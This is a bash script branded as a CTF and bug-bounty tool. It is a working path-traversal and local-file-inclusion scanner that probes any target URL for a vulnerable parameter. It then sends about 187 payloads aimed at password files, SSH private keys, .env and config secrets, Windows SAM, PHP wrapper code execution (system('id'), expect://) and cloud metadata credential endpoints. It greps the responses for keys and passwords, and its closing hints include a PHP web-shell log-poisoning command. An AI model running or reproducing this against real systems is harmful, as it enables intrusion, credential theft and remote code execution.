#!/usr/bin/env bash
# ┌─────────────────────────────────────────────────────────────────┐
# │  READFILE PWNER  —  v1.5  "LOCKED & LOADED"                     │
# │  Made by Taylor Christian Newsome                               │
# │  DEF CON // CTF // authorized bounty only                       │
# │  usage: ./readfile_pwn.sh <url|host/path> [port] [param]        │
# └─────────────────────────────────────────────────────────────────┘
set -u

# ---- colors (because of course) ----
if [ -t 1 ]; then
  R="\033[31m"; G="\033[32m"; Y="\033[33m"; B="\033[34m"
  M="\033[35m"; C="\033[36m"; W="\033[97m"; D="\033[90m"; N="\033[0m"
else
  R=""; G=""; Y=""; B=""; M=""; C=""; W=""; D=""; N=""
fi

# ---- banner ----
banner() {
  echo -e "${M}"
  cat <<'EOF'
   ██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗
   ██╔══██╗██║    ██║████╗  ██║██╔════╝██╔══██╗
   ██████╔╝██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝
   ██╔═══╝ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗
   ██║     ╚███╔███╔╝██║ ╚████║███████╗██║  ██║
   ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
        r e a d f i l e ( )   p w n e r
EOF
  echo -e "${C}  ─────────────────────────────────────────────────────${N}"
  echo -e "${W}  [*] target   : ${TARGET_DISP}${N}"
  echo -e "${W}  [*] param    : ${PARAM}${N}"
  echo -e "${W}  [*] payloads : ${#PAYLOADS[@]}${N}"
  echo -e "${C}  ─────────────────────────────────────────────────────${N}"
  echo -e "${D}  Made by Taylor Christian Newsome${N}"
  echo
}

# ---- args ----
TARGET="${1:-}"
PORT="${2:-}"
PARAM="${3:-}"

[ -z "$TARGET" ] && { echo -e "${R}[!] usage: $0 <url|host/path> [port] [param]${N}"; exit 1; }

# normalize
if   [[ "$TARGET" =~ ^https?:// ]]; then URL="$TARGET"
elif [[ "$TARGET" =~ ^[0-9.]+$ ]]; then URL="http://${TARGET}:${PORT:-80}/"
elif [[ "$TARGET" == *:*        ]]; then URL="http://${TARGET}"
else                                     URL="http://${TARGET}:${PORT:-80}"
fi
URL="${URL%/}"
TARGET_DISP="$URL"

# ---- deps ----
for b in curl base64 grep sed head; do
  command -v "$b" >/dev/null 2>&1 || { echo -e "${R}[!] missing: $b${N}"; exit 1; }
done

# ---- auto param discovery ----
CANDIDATES=(file page path download f src filename doc view template
            include load read content name url redirect next go target
            img image pdf report export data dir folder module action
            lang locale skin theme layout tpl section article id cat)

if [ -z "$PARAM" ]; then
  echo -e "${Y}[*] no param specified — sniffing...${N}"
  for p in "${CANDIDATES[@]}"; do
    c=$(curl -ks -o /dev/null -w "%{http_code}" --max-time 8 \
        "${URL}?${p}=__probe__" 2>/dev/null || echo 000)
    if [ "$c" != "000" ] && [ "$c" != "404" ]; then
      echo -e "${G}    ✔ param → ${p}  (HTTP $c)${N}"
      PARAM="$p"; break
    fi
  done
fi
[ -z "$PARAM" ] && { echo -e "${R}[!] no param. run: $0 $TARGET $PORT <param>${N}"; exit 2; }

# ============================================================================
# ---- PAYLOAD ARMORY — 187 VECTORS ----
# ============================================================================
PAYLOADS=(

  # ─────────────────────────────────────────────────────────────
  # LINUX /etc/passwd TRAVERSAL
  # ─────────────────────────────────────────────────────────────
  "../../../../etc/passwd"
  "../../../../../etc/passwd"
  "../../../../../../etc/passwd"
  "../../../../../../../etc/passwd"
  "../../../../../../../../etc/passwd"
  "../../../../../../../../../etc/passwd"
  "../../../../../../../../../../etc/passwd"
  "....//....//....//....//etc/passwd"
  "....//....//....//....//....//etc/passwd"
  "..%2f..%2f..%2f..%2fetc%2fpasswd"
  "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
  "..%252f..%252f..%252f..%252fetc%252fpasswd"
  "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
  "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
  "..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd"
  "..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc/passwd"
  "/etc/passwd"
  "../../../../etc/passwd%00"
  "../../../../etc/passwd%00.php"
  "../../../../etc/passwd?"

  # ─────────────────────────────────────────────────────────────
  # SENSITIVE LINUX FILES
  # ─────────────────────────────────────────────────────────────
  "/etc/shadow"
  "/etc/group"
  "/etc/hosts"
  "/etc/hostname"
  "/etc/host.conf"
  "/etc/resolv.conf"
  "/etc/issue"
  "/etc/motd"
  "/etc/os-release"
  "/etc/crontab"
  "/etc/fstab"
  "/etc/sudoers"
  "/etc/ssh/ssh_config"
  "/etc/ssh/sshd_config"
  "/etc/apache2/apache2.conf"
  "/etc/apache2/sites-enabled/000-default.conf"
  "/etc/nginx/nginx.conf"
  "/etc/nginx/sites-enabled/default"
  "/etc/mysql/my.cnf"
  "/etc/php/7.4/apache2/php.ini"
  "/etc/php/8.1/apache2/php.ini"
  "/root/.bash_history"
  "/root/.ssh/id_rsa"
  "/root/.ssh/authorized_keys"
  "/root/.mysql_history"
  "/home/ubuntu/.bash_history"
  "/home/ubuntu/.ssh/id_rsa"
  "/home/admin/.bash_history"
  "/home/user/.bash_history"
  "/var/log/auth.log"
  "/var/log/syslog"
  "/var/log/messages"
  "/var/log/dpkg.log"
  "/var/log/apache2/access.log"
  "/var/log/apache2/error.log"
  "/var/log/httpd/access_log"
  "/var/log/httpd/error_log"
  "/var/log/nginx/access.log"
  "/var/log/nginx/error.log"
  "/var/log/vsftpd.log"
  "/var/log/mysql/error.log"

  # ─────────────────────────────────────────────────────────────
  # WEB APP FILES / CONFIGS / BACKUPS
  # ─────────────────────────────────────────────────────────────
  "/var/www/html/index.php"
  "/var/www/html/config.php"
  "/var/www/html/wp-config.php"
  "/var/www/html/.env"
  "/var/www/html/.git/config"
  "/var/www/html/.htaccess"
  "/var/www/html/composer.json"
  "/var/www/html/package.json"
  "/var/www/html/database.php"
  "/var/www/html/db.php"
  "/var/www/html/settings.php"
  "/var/www/html/flag.php"
  "/var/www/html/flag.txt"
  "/var/www/html/robots.txt"
  "/var/www/html/index.php.bak"
  "/var/www/html/index.php~"
  "/var/www/html/index.php.swp"
  "/var/www/html/.index.php.swp"
  "/var/www/html/config.php.bak"
  "/var/www/html/config.php~"
  "/var/www/html/config.php.old"
  "/var/www/html/config.php.save"
  "/var/www/html/config.php.orig"
  "/var/www/html/backup.sql"
  "/var/www/html/db.sql"
  "/var/www/html/dump.sql"
  "/var/www/backup.zip"
  "/var/www/backup.tar.gz"
  "/var/backups/backup.sql"
  "/flag"
  "/flag.txt"
  "/flag.php"
  "/root/flag.txt"
  "/home/flag.txt"
  "/tmp/flag.txt"
  "/opt/flag.txt"

  # ─────────────────────────────────────────────────────────────
  # PROCFS (RCE-ADJACENT + INFO LEAK)
  # ─────────────────────────────────────────────────────────────
  "/proc/self/environ"
  "/proc/self/cmdline"
  "/proc/self/status"
  "/proc/self/mounts"
  "/proc/self/cwd/index.php"
  "/proc/self/root/etc/passwd"
  "/proc/self/fd/0"
  "/proc/self/fd/1"
  "/proc/self/fd/2"
  "/proc/version"
  "/proc/cpuinfo"
  "/proc/meminfo"
  "/proc/net/tcp"
  "/proc/net/arp"
  "/proc/net/route"
  "/proc/1/cmdline"
  "/proc/1/environ"
  "/proc/1/status"
  "/proc/self/maps"
  "/proc/self/cgroup"
  "/proc/self/limits"
  "/proc/self/sched"

  # ─────────────────────────────────────────────────────────────
  # WINDOWS
  # ─────────────────────────────────────────────────────────────
  "..\\..\\..\\..\\windows\\win.ini"
  "..\\..\\..\\..\\..\\windows\\win.ini"
  "..%5c..%5c..%5c..%5cwindows%5cwin.ini"
  "..%255c..%255c..%255c..%255cwindows%255cwin.ini"
  "..\\..\\..\\..\\boot.ini"
  "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
  "..\\..\\..\\..\\windows\\system32\\config\\SAM"
  "..\\..\\..\\..\\windows\\system32\\config\\SYSTEM"
  "..\\..\\..\\..\\inetpub\\wwwroot\\web.config"
  "..\\..\\..\\..\\inetpub\\wwwroot\\index.aspx"
  "C:\\windows\\win.ini"
  "C:\\boot.ini"
  "C:/windows/win.ini"
  "C:/boot.ini"
  "file:///C:/windows/win.ini"
  "file:///C:/boot.ini"
  "file:///C:/inetpub/wwwroot/web.config"

  # ─────────────────────────────────────────────────────────────
  # PHP WRAPPERS — SOURCE DISCLOSURE
  # ─────────────────────────────────────────────────────────────
  "php://filter/convert.base64-encode/resource=index.php"
  "php://filter/convert.base64-encode/resource=../index.php"
  "php://filter/convert.base64-encode/resource=../../index.php"
  "php://filter/convert.base64-encode/resource=config.php"
  "php://filter/convert.base64-encode/resource=../config.php"
  "php://filter/convert.base64-encode/resource=../../config.php"
  "php://filter/convert.base64-encode/resource=wp-config.php"
  "php://filter/convert.base64-encode/resource=../wp-config.php"
  "php://filter/convert.base64-encode/resource=flag.php"
  "php://filter/convert.base64-encode/resource=../flag.php"
  "php://filter/convert.base64-encode/resource=/flag"
  "php://filter/convert.base64-encode/resource=/flag.txt"
  "php://filter/convert.base64-encode/resource=.env"
  "php://filter/convert.base64-encode/resource=../.env"
  "php://filter/convert.base64-encode/resource=composer.json"
  "php://filter/convert.base64-encode/resource=package.json"
  "php://filter/convert.base64-encode/resource=database.php"
  "php://filter/convert.base64-encode/resource=db.php"
  "php://filter/convert.base64-encode/resource=settings.php"
  "php://filter/convert.base64-encode/resource=functions.php"
  "php://filter/convert.base64-encode/resource=header.php"
  "php://filter/convert.base64-encode/resource=footer.php"
  "php://filter/convert.base64-encode/resource=auth.php"
  "php://filter/convert.base64-encode/resource=login.php"
  "php://filter/convert.base64-encode/resource=admin.php"
  "php://filter/convert.base64-encode/resource=upload.php"
  "php://filter/read=convert.base64-encode/resource=index.php"
  "php://filter/convert.iconv.utf-8.utf-16/resource=index.php"
  "php://filter/convert.iconv.utf-8.utf-16le/resource=index.php"
  "php://filter/convert.base64-encode|convert.base64-encode/resource=index.php"
  "php://filter/zlib.deflate/convert.base64-encode/resource=index.php"
  "php://filter/convert.base64-encode/resource=php://filter/convert.base64-encode/resource=index.php"

  # ─────────────────────────────────────────────────────────────
  # PHP WRAPPERS — RCE / INFO
  # ─────────────────────────────────────────────────────────────
  "php://filter/resource=/etc/passwd"
  "php://filter/read=string.rot13/resource=index.php"
  "php://fd/1"
  "php://fd/2"
  "php://stdin"
  "php://stdout"
  "php://stderr"
  "php://input"
  "php://memory"
  "php://temp"
  "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+"
  "data://text/plain;base64,PD9waHAgZWNobyAnUFdORUQnOz8+"
  "data://text/plain,<?php phpinfo();?>"
  "data:text/plain,<?php system('id');?>"
  "expect://id"
  "expect://whoami"
  "expect://uname -a"
  "phar:///tmp/x.phar"
  "zip:///tmp/x.zip#shell.php"
  "compress.zlib://index.php"
  "compress.bzip2://index.php"
  "glob:///etc/*"
  "glob:///var/www/html/*.php"
  "file:///etc/passwd"
  "file:///var/www/html/index.php"

  # ─────────────────────────────────────────────────────────────
  # SSRF / CLOUD METADATA
  # ─────────────────────────────────────────────────────────────
  "http://169.254.169.254/latest/meta-data/"
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  "http://169.254.169.254/latest/user-data"
  "http://169.254.169.254/latest/meta-data/hostname"
  "http://169.254.169.254/latest/meta-data/local-ipv4"
  "http://metadata.google.internal/computeMetadata/v1/"
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
  "http://100.100.100.200/latest/meta-data/"
  "http://127.0.0.1:80/"
  "http://localhost/server-status"
  "http://localhost/phpinfo.php"

  # ─────────────────────────────────────────────────────────────
  # CACHE / SESSION / TEMP / DEV
  # ─────────────────────────────────────────────────────────────
  "/tmp/sess_1"
  "/tmp/sess_admin"
  "/tmp/x"
  "/tmp/shell.php"
  "/var/tmp/x"
  "/var/tmp/sess_1"
  "/var/lib/php/sessions/sess_1"
  "/var/lib/php/sessions/sess_admin"
  "/dev/null"
  "/dev/zero"
  "/dev/random"
  "/dev/urandom"
)

# ---- signature matcher ----
match_sig() {
  local body="$1"
  grep -qE '^root:[^:]*:0:0:'                    <<<"$body" && { echo "linux_passwd";  return; }
  grep -qE '^daemon:[^:]*:1:1:'                  <<<"$body" && { echo "linux_passwd";  return; }
  grep -qE '\[(fonts|extensions|mci extensions)\]' <<<"$body" && { echo "win_ini";     return; }
  grep -q  '^Linux version '                     <<<"$body" && { echo "proc_version"; return; }
  grep -qE '^(HTTP_USER_AGENT|HTTP_ACCEPT|PATH|DOCUMENT_ROOT)=' <<<"$body" && { echo "proc_environ"; return; }
  grep -qE '^USER=.*|^HOME=.*'                   <<<"$body" && { echo "proc_environ"; return; }
  grep -qE '^127\.0\.0\.1|^::1'                  <<<"$body" && { echo "etc_hosts";    return; }
  grep -q  'DISTRIB_ID='                         <<<"$body" && { echo "os_release";   return; }
  grep -q  'DISTRIB_DESCRIPTION='                <<<"$body" && { echo "os_release";   return; }
  grep -qE '^# (Welcome|If you can read this)'   <<<"$body" && { echo "motd";         return; }
  grep -qE '^SSH-(2\.0|1\.99)'                   <<<"$body" && { echo "ssh_banner";   return; }
  grep -qE '^apt.*cron|^SHELL=|^PATH='           <<<"$body" && { echo "cron_or_env";  return; }
  grep -qE '^(mysql|postgres|redis)'             <<<"$body" && { echo "service_conf"; return; }
  grep -qE '^(root|ubuntu|admin|deploy).*bash'   <<<"$body" && { echo "bash_history"; return; }
  grep -qE 'aws_access_key_id|AWS_SECRET'        <<<"$body" && { echo "aws_creds";    return; }
  grep -qE 'AKIA[0-9A-Z]{16}'                    <<<"$body" && { echo "aws_key";      return; }
  grep -qE 'BEGIN (RSA|OPENSSH|DSA|EC|PGP) PRIVATE KEY' <<<"$body" && { echo "private_key"; return; }
  grep -qE 'flag\{|FLAG\{|CTF\{|ctf\{|HTB\{|picoCTF\{|DUCTF\{|THM\{' <<<"$body" && { echo "FLAG"; return; }
  grep -qE 'DB_PASSWORD|DB_USER|DB_HOST|DATABASE_URL|MYSQL_PWD' <<<"$body" && { echo "db_creds"; return; }
  grep -qE 'SECRET_KEY|API_KEY|JWT_SECRET|APP_KEY' <<<"$body" && { echo "app_secrets"; return; }
  grep -q  'localhost'                           <<<"$body" && { echo "etc_hosts";    return; }
  return 1
}

b64_try() {
  local body="$1" clean d

  # entropy gate: skip obvious non-base64
  [ "${#body}" -lt 40 ] && return 0
  local alnum
  alnum=$(tr -cd 'A-Za-z0-9+/=' <<<"$body" | wc -c)
  [ "$alnum" -lt $(( ${#body} * 85 / 100 )) ] && return 0

  clean=$(tr -d '\r\n\t ' <<<"$body")
  case $(( ${#clean} % 4 )) in
    2) clean="${clean}==";;
    3) clean="${clean}=";;
    1) return 0;;
  esac

  d=$(echo "$clean" | base64 -d 2>/dev/null) || return 0
  if grep -qE '<\?php|<\?=|function |class |DB_|API_|SECRET|PASSWORD|PRIVATE KEY|flag\{|FLAG\{|CTF\{|AKIA[0-9A-Z]{16}' <<<"$d"; then
    echo "$d"
  fi
  return 0
}

# ---- GO ----
banner
FOUND=0; i=0
for p in "${PAYLOADS[@]}"; do
  i=$((i+1))

  # url-encode via curl round-trip
  enc=$(curl -sG -o /dev/null -w '%{url_effective}' \
        --data-urlencode "${PARAM}=${p}" "$URL" 2>/dev/null \
        | sed "s|.*${PARAM}=||")

  req="${URL}?${PARAM}=${enc}"

  body=$(curl -ks --max-time 12 \
         -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
         "$req" 2>/dev/null || true)
  code=$(curl -ks -o /dev/null -w '%{http_code}' --max-time 8 \
         -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
         "$req" 2>/dev/null || echo 000)

  sig=$(match_sig "$body" || true)
  b64=$(b64_try   "$body" || true)

  # ── confirmation pass: re-fetch vs control to kill reflected FPs ──
  if [ -n "$sig" ] || [ -n "$b64" ]; then
    ctl=$(curl -ks --max-time 8 \
      -A "Mozilla/5.0" \
      "${URL}?${PARAM}=__control_$(date +%s%N)__" 2>/dev/null || true)
    if [ "$body" = "$ctl" ]; then
      sig=""; b64=""
    fi
  fi

  if [ -n "$sig" ] || [ -n "$b64" ]; then
    FOUND=$((FOUND+1))
    echo
    echo -e "${G}  ╔══════════════════════════════════════════════════╗${N}"
    echo -e "${G}  ║  💀 HIT  ${W}${i}/${#PAYLOADS[@]}  ${Y}${sig:-php_b64}${G}   HTTP ${code}   ║${N}"
    echo -e "${G}  ╚══════════════════════════════════════════════════╝${N}"
    echo -e "${C}  ▶ payload:${N} $p"
    if [ -n "$b64" ]; then
      echo -e "${C}  ▶ decoded source (first 40 lines):${N}"
      echo "$b64" | head -n 40 | sed 's/^/      /'
    else
      echo "$body" | head -n 20 | sed 's/^/      /'
    fi
    echo
  else
    printf "  ${Y}[%03d/%03d]${N} %-56s ${R}✘${N} HTTP %s\n" \
           "$i" "${#PAYLOADS[@]}" "$p" "$code"
  fi
done

echo
if [ "$FOUND" -gt 0 ]; then
  echo -e "${G}  ┌────────────────────────────────────────────────────────────┐${N}"
  echo -e "${G}  │  ${W}$FOUND HIT(S) — target is PWNED via param '${PARAM}'${G}  │${N}"
  echo -e "${G}  └────────────────────────────────────────────────────────────┘${N}"
  echo -e "${Y}  next moves:${N}"
  echo -e "    • ${C}log poisoning${N}  →  curl -A '<?php system(\$_GET[c]);?>' \$TARGET"
  echo -e "    • ${C}session file${N}  →  read /var/lib/php/sessions/sess_<id>"
  echo -e "    • ${C}config leak${N}   →  php://filter/convert.base64-encode/resource=config.php"
  echo -e "    • ${C}backup hunt${N}   →  index.php.bak / .swp / .old / backup.sql"
  echo -e "    • ${C}cloud creds${N}   →  http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  echo -e "${D}  Made by Taylor Christian Newsome${N}"
  exit 0
else
  echo -e "${R}  [-] no hits. try:${N}"
  echo "      $0 $TARGET $PORT <other_param>"
  echo "      or add cookies: -c 'PHPSESSID=...'"
  echo -e "${D}  Made by Taylor Christian Newsome${N}"
  exit 1
fi
